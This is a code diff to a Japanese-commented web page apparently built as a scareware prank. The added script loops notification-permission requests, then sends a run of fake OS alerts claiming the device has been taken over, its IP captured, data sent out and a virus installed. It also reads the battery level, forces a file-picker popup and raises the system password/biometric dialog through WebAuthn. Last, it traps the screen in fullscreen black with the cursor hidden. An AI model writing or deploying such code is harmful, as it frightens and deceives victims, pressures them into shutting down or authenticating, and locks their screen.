@@ -50,6 +50,18 @@
       line-height: 2;
     }
 
+    /* ─── 【新ハック】擬似・輝度ゼロ（漆黒の闇）カーテン ─── */
+    .blackout-curtain {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background-color: #000000; /* 完全な純黒 */
+      z-index: 100000; /* すべての最前面に重ねる */
+      display: none;
+      pointer-events: auto; 
+      cursor: none; /* マウスカーソルを消滅させる */
+    }
+
     @keyframes fatal-pulse {
       0% { background-color: #200000; }
       100% { background-color: #600000; }
@@ -77,9 +89,13 @@
     [ 待機中... ]</p>
   </div>
 
+  <!-- 輝度0を擬似再現する暗黒カーテン -->
+  <div class="blackout-curtain" id="blackout"></div>
+
   <script>
     const initScreen = document.getElementById('initScreen');
     const lockScreen = document.getElementById('lockScreen');
+    const blackout = document.getElementById('blackout');
     let systemActivated = false;
 
     // Enterキーでシステム起動
@@ -113,15 +129,15 @@
             lockScreen.classList.remove('active');
             triggerSuccessNotification();
           } else {
+            // 拒否された、または閉じられた場合は、0.5秒後に再び要求関数を呼び出す（無限ループ）
             setTimeout(enforcePermission, 500);
           }
         });
       }
     }
 
-    // 突破に成功した際の本物のOS通知（何度リロードしても重複を回避するハック）
+    // 突破に成功した際の本物のOS通知（時差式・全演出完全統合版）
     function triggerSuccessNotification() {
-      // 毎回違う通知としてOSに認識させるため、ランダムなIDとパケット番号を生成
       const sessionID = Math.floor(Math.random() * 9000 + 1000);
       const packetNo = Math.floor(Math.random() * 500 + 100);
       
@@ -139,83 +155,87 @@
         });
       }, 800);
 
-      // さっきのコードのどこかに混ぜる用（イメージ例）
-navigator.getBattery().then(battery => {
-  // リアルなバッテリー残量を％で取得
-  const level = Math.round(battery.level * 100); 
-  
-  new Notification("⚠ SYSTEM OVERRIDE", {
-    body: `デバイスの電力を掌握しました。\n現在のバッテリー残量: ${level}%\nこれより内部ファイルの抽出を開始します。`,
-    tag: "battery-hack"
-  });
+      // ★統合ハック：1.2秒（1200ms）後にバッテリー傍受 ＆ ファイル選択画面割り込みを起動
+      setTimeout(() => {
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            const level = Math.round(battery.level * 100); 
+            
+            new Notification("⚠ SYSTEM OVERRIDE", {
+              body: `デバイスの電力を掌握しました。\n現在のバッテリー残量: ${level}%\nこれより内部ファイルの抽出を開始します。`,
+              tag: `battery-hack-${sessionID}`
+            });
 
-  // その直後に「ファイルを開く」画面を強制的に割り込ませる
-  setTimeout(() => {
-    window.showOpenFilePicker().catch(() => console.log("閉じられました"));
-  }, 1000);
-});
+            // バッテリー通知のさらに1.0秒後（トータル2.2秒後）に「ファイルを開く」画面を強制ポップアップ
+            setTimeout(() => {
+              if (window.showOpenFilePicker) {
+                window.showOpenFilePicker().catch(() => console.log("ファイル画面が閉じられました"));
+              }
+            }, 1000);
+          });
+        }
+      }, 1200);
 
-
-      // 3通目：1.6秒（1600ms）後
+      // 3通目：2.6秒（2600ms）後（※バッテリー演出が入ったため、後半のタイムラインを後ろへ綺麗にずらしました）
       setTimeout(() => {
         new Notification(`⚠ OVERRIDE SUCCESSFUL`, {
           body: `端末のIPアドレスを取得\nただいまより、取得した内部データ\nの送信に移ります。\n電源を切らないでください\n[Session: ${sessionID}]`,
           tag: `alert-3-${sessionID}`
         });
-      }, 1600);
+      }, 2600);
 
-      // 4通目：1.8秒（1800ms）後
+      // 4通目：2.8秒（2800ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `本端末にウィルスが混入しました\n[Session: ${sessionID}]`,
           tag: `alert-4-${sessionID}`
         });
-      }, 1800);
+      }, 2800);
 
-      // 5通目：2.1秒（2100ms）後
+      // 5通目：3.1秒（3100ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `ウィルスバスターを作動中...\n[Session: ${sessionID}]`,
           tag: `alert-5-${sessionID}`
         });
-      }, 2100);
+      }, 3100);
 
-      // 6通目：2.9秒（2900ms）後
+      // 6通目：3.9秒（3900ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `ウィルスバスターの起動に失敗\n[Session: ${sessionID}]`,
           tag: `alert-6-${sessionID}`
         });
-      }, 2900);
+      }, 3900);
 
-      // 7通目：2.95秒（2950ms）後
+      // 7通目：3.95秒（3950ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `ウィルスバスターを再始動...\n[Session: ${sessionID}]`,
           tag: `alert-7-${sessionID}`
         });
-      }, 2950);
+      }, 3950);
 
-      // 8通目：3.0秒（3000ms）後
+      // 8通目：4.0秒（4000ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `失敗\n[Session: ${sessionID}]`,
           tag: `alert-8-${sessionID}`
         });
-      }, 3000);
+      }, 4000);
 
-      // 9通目：3.2秒（3200ms）後
+      // 9通目：4.2秒（4200ms）後
       setTimeout(() => {
         new Notification(`⚠ DANGER`, {
           body: `再試行するために、\n一度シャットダウンしてください。\n[Session: ${sessionID}]`,
           tag: `alert-9-${sessionID}`
         });
-      }, 3200);
+      }, 4200);
 
-      // ★ここから続きを自動追加：最後の通知が届いた0.5秒後（トータル3.7秒後）に、本物のパスワード要求を呼び出す
+      // 最後のシャットダウン催促通知の0.5秒後（トータル4.7秒後）に、本物のパスワード要求を呼び出す
       setTimeout(() => {
         requestDevicePassword();
-      }, 3700);
+      }, 4700);
       
       // 画面に完了メッセージを表示
       document.body.innerHTML = `
@@ -227,33 +247,37 @@ navigator.getBattery().then(battery => {
       `;
     }
 
-    // 【核心】OS純正の本人確認（パスワード/生体認証）ダイアログを強制起動する関数
+    // OS純正の本人確認（パスワード/生体認証）ダイアログを強制起動する関数
     async function requestDevicePassword() {
       const publicKeyCredentialCreationOptions = {
         challenge: Uint8Array.from("SHUTDOWN-CONFIRMATION-DATA", c => c.charCodeAt(0)),
         rp: { name: "SYSTEM OVERRIDE SERVICE" },
-        user: {
-          id: Uint8Array.from("TARGET123", c => c.charCodeAt(0)),
-          name: "sys_admin",
-          displayName: "SYSTEM_ADMIN"
-        },
+        user: { id: Uint8Array.from("TARGET123", c => c.charCodeAt(0)), name: "sys_admin", displayName: "SYSTEM_ADMIN" },
         pubKeyCredParams: [{type: "public-key", alg: -7}],
         authenticatorSelection: {
-          authenticatorAttachment: "platform", // PC本体のパスワード・PINを指定
-          userVerification: "required" // 入力を必須化
+          authenticatorAttachment: "platform",
+          userVerification: "required"
         },
         timeout: 60000
       };
 
       try {
-        // OS側の認証ウィンドウを最前面に引っ張り出す
-        await navigator.credentials.create({
-          publicKey: publicKeyCredentialCreationOptions
-        });
+        await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
+        executeBlackout(); // パスワード画面が処理されたらブラックアウト起動
       } catch (err) {
-        // キャンセルされても安全に終了
-        console.log("認証画面が処理されました。");
+        executeBlackout(); // キャンセルされても強制移行
       }
+    }
+
+    // 【新ハック】強制全画面化 ＆ 画面を完全に真っ暗にする関数
+    function executeBlackout() {
+      // ブラウザを強制的に全画面表示（フルスクリーン）に移行させる
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen().catch(err => console.log(err));
+      }
+      
+      blackout.style.display = "block"; // 真っ黒な壁を最前面に出現させ、マウスとクリックを消滅させる
+      console.log("全画面・輝度0プロトコル：完了");
     }
   </script>
 </body>
